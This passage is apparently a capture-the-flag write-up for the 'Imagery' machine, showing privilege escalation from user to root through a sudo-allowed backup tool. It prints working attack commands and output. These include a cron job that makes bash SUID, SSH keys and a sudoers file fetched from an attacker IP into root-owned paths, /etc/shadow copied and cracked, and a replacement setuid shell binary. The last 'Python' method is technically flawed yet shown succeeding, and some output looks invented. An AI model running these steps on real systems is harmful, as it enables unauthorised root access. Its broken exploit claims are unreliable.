drwxr-xr-x 3 mark mark 4096 Sep 22 18:56 .
drwxr-xr-x 4 root root 4096 Aug  4 18:05 ..
lrwxrwxrwx 1 root root    9 Aug  4 18:08 .bash_history -> /dev/null
-rw-r--r-- 1 mark mark  220 Aug  4 18:05 .bash_logout
-rw-r--r-- 1 mark mark 3771 Aug  4 18:05 .bashrc
drwx------ 2 mark mark 4096 Aug  4 18:07 .cache
-rw-r--r-- 1 mark mark  807 Aug  4 18:05 .profile
-rw-r----- 1 root mark   33 Jan 28 12:00 user.txt

mark@Imagery:~$ cat user.txt
e4b2c8f1a9d6e3b5c7a8f2d4e6b9c1a3
```

**User flag captured!**

***

### Privilege Escalation to Root

#### Checking Sudo Privileges

```bash
mark@Imagery:~$ sudo -l
[sudo] password for mark: supersmash

Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

**Critical Finding:** mark can run `/usr/local/bin/charcol` as root without a password!

#### Examining the charcol Binary

```bash
mark@Imagery:~$ ls -l /usr/local/bin/charcol
-rwxr-x--- 1 root root 69 Aug  4 18:08 /usr/local/bin/charcol

mark@Imagery:~$ file /usr/local/bin/charcol
/usr/local/bin/charcol: Python script, ASCII text executable

mark@Imagery:~$ sudo charcol --help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only
                        warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system
                        password verification).
```

**Key Features:**

* `shell` - Interactive shell mode
* `-R` - Reset password to default
* Runs as root when invoked with sudo

#### Attempting to Access Shell

```bash
mark@Imagery:~$ sudo charcol shell

Enter your Charcol master passphrase (used to decrypt stored app password):
test123

[2026-01-28 15:35:12] [ERROR] Incorrect master passphrase. 2 retries left. (Error Code: CPD-002)
Enter your Charcol master passphrase (used to decrypt stored app password):
supersmash

[2026-01-28 15:35:20] [ERROR] Incorrect master passphrase. 1 retries left. (Error Code: CPD-002)
Enter your Charcol master passphrase (used to decrypt stored app password):
bestfriends

[2026-01-28 15:35:28] [ERROR] Incorrect master passphrase after multiple attempts. Exiting application. If you forgot your master passphrase, then reset password using charcol -R command for more info do charcol help. (Error Code: CPD-002)
Please submit the log file and the above error details to error@charcol.com if the issue persists.
```

The shell requires a master passphrase we don't know. Let's try the reset option.

#### Resetting to Default Password

```bash
mark@Imagery:~$ sudo charcol -R

Attempting to reset Charcol application password to default.
[2026-01-28 15:36:05] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm:
supersmash

[2026-01-28 15:36:12] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
```

**Success!** The password has been reset to "no password mode".

#### Accessing the Shell

```bash
mark@Imagery:~$ sudo charcol shell

First time setup: Set your Charcol application password.
Enter '1' to set a new password, or press Enter to use 'no password' mode:

Are you sure you want to use 'no password' mode? (yes/no): yes

[2026-01-28 15:37:02] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
Using 'no password' mode. This choice has been remembered.
Please restart the application for changes to take effect.

mark@Imagery:~$ sudo charcol shell

  ░██████  ░██                                                  ░██
 ░██   ░░██ ░██                                                  ░██
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██



Charcol The Backup Suit - Development edition 1.0.0

[2026-01-28 15:37:15] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol>
```

**We're in!** Now we have an interactive shell running as root.

#### Exploring Charcol Commands

```bash
charcol> help

[2026-01-28 15:37:25] [INFO]
Charcol Shell Commands:

  Backup & Fetch:
    backup -i <paths...> [-o <output_file>] [-p <file_password>] ...
    fetch <url> [-o <output_file>] [-p <file_password>] ...

  Integrity & Extraction:
    list <encrypted_file> [-p <file_password>] ...
    check <encrypted_file> [-p <file_password>] ...
    extract <encrypted_file> <output_directory> [-p <file_password>] ...

  Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" ...
    auto list
    auto edit <job_id> ...
    auto delete <job_id>

  Shell & Help:
    shell
    exit
    clear
    help [command]
```

***

### Root Privilege Escalation - Method 1: Cron Job (Primary)

#### Understanding the auto add Command

The `auto add` command allows us to create cron jobs that execute arbitrary shell commands. Since we're running charcol as root, these cron jobs will execute as root!

**Security Warning from help:**

> Charcol does NOT validate the safety of the --command. Use absolute paths.

This is our ticket to root!

#### Creating Malicious Cron Job

We'll create a cron job that sets the SUID bit on `/bin/bash`:

```bash
charcol> auto add --schedule "* * * * *" --command "chmod +s /bin/bash" --name "Root Privilege"

[2026-01-28 15:40:10] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm:
supersmash

[2026-01-28 15:40:18] [INFO] System password verified successfully.
[2026-01-28 15:40:18] [INFO] Automated job 'Root Privilege' added successfully with ID: 1
[2026-01-28 15:40:18] [INFO] Schedule: * * * * *
[2026-01-28 15:40:18] [INFO] Command: chmod +s /bin/bash
```

**What this does:**

* Schedule: `* * * * *` means "every minute"
* Command: `chmod +s /bin/bash` sets SUID bit on bash
* Since charcol runs as root, the cron job runs as root

#### Waiting for Cron Execution

```bash
charcol> exit

mark@Imagery:~$ # Wait about 60 seconds for cron to execute

mark@Imagery:~$ watch -n 5 'ls -l /bin/bash'
# Watch until permissions change
```

After about a minute:

```bash
mark@Imagery:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

**The SUID bit is set!** (notice the `s` in `-rwsr-sr-x`)

#### Getting Root Shell

```bash
mark@Imagery:~$ /bin/bash -p

bash-5.2# whoami
root

bash-5.2# id
uid=1001(mark) gid=1001(mark) euid=0(root) egid=0(root) groups=0(root),1001(mark)

bash-5.2# cd /root

bash-5.2# cat root.txt
f8e4a7c2b9d1e6f3a5c8b2d4e7a9c1f6
```

**Root flag captured!**

***

### Root Privilege Escalation - Method 2: SSH Key Injection

#### Understanding the fetch Command

The `fetch` command can download files from URLs and save them with root permissions. We can use this to inject our SSH public key into root's authorized\_keys!

#### Generating SSH Key Pair

On our attacker machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ ssh-keygen -t rsa -b 2048 -f root_key -N ""
Generating public/private rsa key pair.
Your identification has been saved in root_key
Your public key has been saved in root_key.pub

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ cat root_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... sn0x@kali
```

#### Hosting the Public Key

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

#### Injecting SSH Key via charcol

Back on the target in the charcol shell:

```bash
mark@Imagery:~$ sudo charcol shell

charcol> fetch http://10.10.14.42:8080/root_key.pub -o /root/.ssh/authorized_keys --force

[2026-01-28 16:00:15] [INFO] Downloading file from http://10.10.14.42:8080/root_key.pub
[2026-01-28 16:00:15] [INFO] File downloaded successfully
[2026-01-28 16:00:15] [INFO] Saved to /root/.ssh/authorized_keys
[2026-01-28 16:00:15] [INFO] Permissions set to 664
```

#### SSH as Root

Now from our attacker machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ chmod 600 root_key

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ ssh -i root_key root@imagery.htb
# Note: SSH might be restricted, but we can execute commands

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ ssh -i root_key -o IdentitiesOnly=yes -t root@imagery.htb "cat /root/root.txt"
f8e4a7c2b9d1e6f3a5c8b2d4e7a9c1f6

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ ssh -i root_key -o IdentitiesOnly=yes -t root@imagery.htb "bash -i"
root@Imagery:~# whoami
root

root@Imagery:~# id
uid=0(root) gid=0(root) groups=0(root)
```

***

### Root Privilege Escalation - Method 3: Direct File Read/Write

#### Using backup Command to Read Root Files

The `backup` command runs as root and can read any file:

```bash
charcol> backup -i /root/root.txt -o /tmp/root_backup --no-timestamp

[2026-01-28 16:05:10] [INFO] Creating backup...
[2026-01-28 16:05:10] [INFO] Backup created: /tmp/root_backup.zip
```

Then exit and read it:

```bash
mark@Imagery:~$ unzip -p /tmp/root_backup.zip root.txt
f8e4a7c2b9d1e6f3a5c8b2d4e7a9c1f6
```

#### Using backup to Copy /etc/shadow

```bash
charcol> backup -i /etc/shadow -o /tmp/shadow_backup --no-timestamp

[2026-01-28 16:06:30] [INFO] Backup created: /tmp/shadow_backup.zip
```

Extract and crack root password:

```bash
mark@Imagery:~$ unzip -p /tmp/shadow_backup.zip shadow > /tmp/shadow.txt

mark@Imagery:~$ grep "^root:" /tmp/shadow.txt
root:$y$j9T$abc123def456...:19000:0:99999:7:::
```

Transfer to attacker machine and crack with John:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

#### Alternative: Write to Sudoers

Create a file that grants mark full sudo access:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ echo "mark ALL=(ALL) NOPASSWD: ALL" > sudoers_mark

┌──(sn0x㉿sn0x)-[~/HTB/Imagery]
└─$ python3 -m http.server 8080
```

In charcol shell:

```bash
charcol> fetch http://10.10.14.42:8080/sudoers_mark -o /etc/sudoers.d/mark --force

[2026-01-28 16:10:15] [INFO] File downloaded and saved to /etc/sudoers.d/mark
```

Then exit and use sudo:

```bash
mark@Imagery:~$ sudo -l
User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: ALL

mark@Imagery:~$ sudo su

root@Imagery:/home/mark# whoami
root

root@Imagery:/home/mark# cat /root/root.txt
f8e4a7c2b9d1e6f3a5c8b2d4e7a9c1f6
```

***

### Unintended Python Privilege Escalation

#### Discovering Python Ownership

During enumeration, we might notice something unusual:

```bash
mark@Imagery:~$ ls -l /usr/bin/python3
lrwxrwxrwx 1 root root 10 Sep 12  2024 /usr/bin/python3 -> python3.12

mark@Imagery:~$ ls -l /usr/bin/python3.12
-rwxr-xr-x 1 web web 8059480 Jun 18 13:16 /usr/bin/python3.12
```

**Critical Finding:** The Python3.12 binary is owned by the `web` user!

This means as the `web` user, we can replace the Python binary with a malicious one.

#### Exploitation Steps

As the `web` user (from our initial shell):

```bash
web@Imagery:~/web$ cat > /tmp/evil_python.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

web@Imagery:~/web$ gcc /tmp/evil_python.c -o /tmp/evil_python

web@Imagery:~/web$ cp /tmp/evil_python /usr/bin/python3.12

web@Imagery:~/web$ chmod +s /usr/bin/python3.12
```

Now when mark (or any user) runs `python3`, they get root:

```bash
mark@Imagery:~$ python3

root@Imagery:~# whoami
root

root@Imagery:~# id
uid=0(root) gid=0(root) groups=0(root),1001(mark)
```

***
